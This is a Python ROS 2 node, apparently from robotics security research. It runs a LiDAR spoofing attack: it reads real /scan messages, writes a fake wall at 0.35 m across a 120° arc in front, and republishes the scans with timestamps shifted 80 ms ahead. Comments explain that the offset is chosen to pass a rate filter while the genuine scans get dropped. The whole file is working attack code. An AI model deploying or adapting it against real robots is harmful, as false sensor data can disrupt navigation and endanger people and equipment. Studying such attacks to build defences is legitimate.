import copy
import math
import rclpy
import rclpy.parameter
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy, DurabilityPolicy
from sensor_msgs.msg import LaserScan

SENSOR_QOS = QoSProfile(
    depth=10,
    reliability=ReliabilityPolicy.BEST_EFFORT,
    durability=DurabilityPolicy.VOLATILE,
)
PUB_QOS = QoSProfile(
    depth=10,
    reliability=ReliabilityPolicy.RELIABLE,
    durability=DurabilityPolicy.VOLATILE,
)

WALL_RANGE = 0.35
WALL_HALF_DEG = 60

# Must be > rate filter's min interval (1/15Hz = 67ms) so the filter passes us,
# but < real sensor interval (100ms) so the next real scan gets dropped.
TIMESTAMP_OFFSET_NS = 80_000_000   # 80 ms


class Attacker2(Node):
    def __init__(self, **kwargs):
        super().__init__('lidar_attacker2', **kwargs)
        self._logged = False

        self.sub = self.create_subscription(
            LaserScan, '/scan', self._scan_cb, SENSOR_QOS)
        self.pub = self.create_publisher(
            LaserScan, '/scan', PUB_QOS)

        self.get_logger().info(
            'Smart attacker active: timestamp-spoofed scans at ~10 Hz '
            '(bypasses rate filter)')

    def _scan_cb(self, msg: LaserScan):
        n = len(msg.ranges)
        angle_increment = msg.angle_increment
        center = int(round(-msg.angle_min / angle_increment)) % n
        spread = int(round(math.radians(WALL_HALF_DEG) / angle_increment))

        # Skip our own published scans to prevent a timestamp cascade
        if abs(msg.ranges[center] - WALL_RANGE) < 0.01:
            return

        if not self._logged:
            self.get_logger().info(
                f'First real scan received — center_idx={center}, spread={spread}')
            self._logged = True

        fake = copy.deepcopy(msg)

        # Stamp 80 ms ahead of real scan: passes the rate filter's 67 ms threshold,
        # but causes the next real scan (arriving 20 ms later) to be dropped.
        total_ns = msg.header.stamp.sec * 10**9 + msg.header.stamp.nanosec
        total_ns += TIMESTAMP_OFFSET_NS
        fake.header.stamp.sec = total_ns // 10**9
        fake.header.stamp.nanosec = total_ns % 10**9

        for offset in range(-spread, spread + 1):
            fake.ranges[(center + offset) % n] = WALL_RANGE

        self.pub.publish(fake)


def main():
    rclpy.init()
    node = Attacker2(parameter_overrides=[
        rclpy.parameter.Parameter(
            'use_sim_time',
            rclpy.parameter.Parameter.Type.BOOL,
            True,
        )
    ])
    rclpy.spin(node)
    rclpy.shutdown()
